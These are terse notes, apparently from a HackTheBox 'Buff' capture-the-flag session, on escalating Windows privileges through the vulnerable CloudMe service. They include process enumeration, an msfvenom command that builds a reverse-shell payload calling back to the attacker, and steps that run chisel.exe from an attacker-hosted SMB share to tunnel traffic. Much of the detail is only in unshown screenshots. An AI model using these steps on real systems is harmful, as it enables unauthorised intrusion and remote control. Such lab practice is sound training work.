# Windows Privilege Escalation via Vulnerable Software | Real-World Privesc

# HackTheBox : Buff

**Connected with a webshell**

**Reverse shell = TCP connection**

**Webshell = takes a long time with restrictions**

## We take powershell / cmd by transfering nc

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%201.png)

System: which ports are open

```jsx
netstat -ano 
```

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%202.png)

Show Process

```jsx
tasklist | findstr /I 5748
```

```jsx
Get-NetTCPConnection
```

```jsx
Get-NetTCPConnection -LocalPort 8888
```

```jsx
(Get-NetTCPConnection -LocalPort 8888).OwningProcess
```

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%203.png)

```jsx
Get-Process -Id  8460
```

```jsx
Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess
```

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%204.png)

# **Command 1: PowerShell Directory Search (Failed)**

**powershell**

```
dir /S /B *CloudMe*
```

# **Command 2: Spawning CMD from PowerShell (Successful)**

**powershell**

```
cmd -c"dir /S /B *CloudMe*"
```

# **Command 3: Legacy CMD Directory Search (Executed inside the spawned shell)**

### **cmd**

```
dir /S /B *CloudMe*
```

![Screenshot From 2026-09-03 01-32-17.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/Screenshot_From_2026-09-03_01-32-17.png)

### Next

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%205.png)

### Next

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%206.png)

```jsx
msfvenom -a x86 -p windows/shell_reverse_tcp -b '\x00\x0A\x0D' -f python LHOST=tun0 LPORT=4445 -v payload

```

## Target can't run Python for this script, so make a tunnel; chisel

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%207.png)

### Transfer through SMB SERVER

```jsx
impacket-smbserver share . -smb2support
```

### On Target machine

```jsx
cd %temp%
\\kali_ip\share\chisel.exe 
```

> **Target machine = client**
> 

> **Attacking machine = server**
> 

> **If Bind shell, ATTACK = CLIENT**
> 

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%208.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%209.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%2010.png)

### Next

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%2011.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%2012.png)

### Got Shell because of

![image.png](Windows%20Privilege%20Escalation%20via%20Vulnerable%20Softwa/image%2013.png)